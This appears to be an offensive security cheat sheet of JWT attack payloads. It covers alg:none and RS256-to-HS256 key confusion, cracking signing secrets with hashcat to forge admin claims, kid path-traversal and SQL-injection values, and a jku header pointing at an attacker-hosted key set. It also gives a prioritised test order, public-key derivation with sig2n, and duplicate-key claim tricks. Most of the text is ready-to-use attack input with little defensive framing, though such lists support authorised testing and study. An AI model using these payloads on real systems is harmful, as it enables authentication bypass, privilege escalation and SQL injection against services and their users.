---
title: "Payloads: JWT"
type: payloads
tags: [payloads, jwt, authentication, web]
sources: []
date_created: 2026-06-05
date_updated: 2026-11-09
---

# Payloads: JWT

Attacks on JSON Web Tokens. See [[jwt-attacks]].

## Recon
```
decode header+payload (base64url). Note alg, kid, jku/x5u, iss, exp.
```

## alg confusion / none
```
alg:none  -> header {"alg":"none"} , empty signature
RS256 -> HS256 confusion: sign with the PUBLIC key as HMAC secret
```

## Weak secret (HS256)
```
hashcat -m 16500 token.txt wordlist        # crack signing secret
then forge: change sub/role/admin -> re-sign with cracked secret
```

## kid / header injection
```
kid path traversal:  "kid":"../../../../dev/null"  -> empty key -> sign with ""
kid SQLi:            "kid":"x' UNION SELECT 'key'-- -"
jku/x5u SSRF:        "jku":"https://attacker/jwks.json"   (host your own key set)
```

## Logic
```
no exp check (replay) · accepts tokens from other tenant · weak/none iss check ·
algorithm downgrade · signature not verified server-side (just decoded)
```

## Tooling
```
jwt_tool <token> -M at        # automated checks
jwt.io to inspect (never paste client tokens off-network)
```

## NEW 2025-2026

Test order (walk top to bottom, cheapest first):
```
1. alg:none / alg stripped
2. jwk header embed    {"jwk":{...own key...}}      sign with own key
3. jku header          point kid fetch at attacker JWKS
4. kid traversal       ../../../../dev/null -> empty secret
   kid SQLi            x' UNION SELECT 'secret'-- -
5. RS256->HS256 confusion (sign with the PUBLIC key bytes as HMAC secret,
   byte-identical PEM incl. newlines)
```

Public key not exposed? Derive the RSA public key from TWO tokens with the
same kid:
```
docker run --rm -it portswigger/sig2n <token1> <token2>
# emits candidate PEMs + pre-forged HS256 tokens; replay to find the winner
```

Claim-parser differentials (2025-26 favorite): duplicate JSON keys
`{"role":"user","role":"admin"}` (first-wins vs last-wins per library),
`exp`/`iat` deletion, `aud` from another app in the same tenant.
